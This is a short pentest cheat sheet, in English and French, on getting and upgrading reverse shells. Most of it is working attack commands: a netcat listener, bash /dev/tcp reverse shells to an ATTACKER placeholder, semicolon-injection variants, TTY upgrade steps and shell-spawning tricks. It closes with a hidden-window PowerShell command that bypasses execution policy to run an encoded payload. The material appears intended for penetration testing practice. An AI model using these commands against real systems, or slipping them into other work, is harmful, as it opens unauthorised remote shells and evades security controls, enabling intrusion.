# Reverse Shells

## Ressources

* [revshells.com](https://www.revshells.com/)
* [pentestmonkey - reverse shell cheatsheet](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [InternalAllTheThings - shell reverse cheatsheet](https://swisskyrepo.github.io/InternalAllTheThings/cheatsheets/shell-reverse-cheatsheet/)
* [shellerator](https://github.com/ShutdownRepo/shellerator)

## Linux

### Reverse Shell

```bash
nc -nlvp 4444

bash -i >& /dev/tcp/ATTACKER/4444 0>&1

# variante bash -c — utile pour injection (SQLi RCE, commande système, etc.)
bash -c "bash -i >& /dev/tcp/ATTACKER/4444 0>&1"

# via point-virgule (injection dans un paramètre)
; bash -c 'bash -i >& /dev/tcp/ATTACKER/443 0>&1'
```

### Upgrade TTY

```bash
# Étape 1 — dans le reverse shell
python -c 'import pty; pty.spawn("/bin/bash")'
# ou
/usr/bin/script -qc /bin/bash /dev/null

# Étape 2 — mettre en arrière-plan
Ctrl-Z

# Étape 3 — sur Kali
stty raw -echo
fg

# Étape 4 — dans le reverse shell
reset
export SHELL=bash
export TERM=xterm-256color
stty rows <num> columns <cols>
```

### Spawning a shell

```bash
/bin/sh -i
echo os.system('/bin/bash')

# Vi
:!bash
:set shell=/bin/bash:shell

perl -e 'exec "/bin/sh";'
ruby: exec "/bin/sh"
lua: os.execute('/bin/bash')
```


## Windows

```powershell
# -nop        : NoProfile — ne charge pas le profil PowerShell (plus furtif, plus rapide)
# -noni       : NonInteractive — pas de prompt, pas d'input utilisateur
# -w hidden   : WindowStyle Hidden — fenêtre invisible
# -ep bypass  : ExecutionPolicy Bypass — ignore la politique d'exécution des scripts
# -e          : EncodedCommand — payload base64 encodé en UTF-16LE

powershell -nop -noni -w hidden -ep bypass -e <BASE64_PAYLOAD>
```


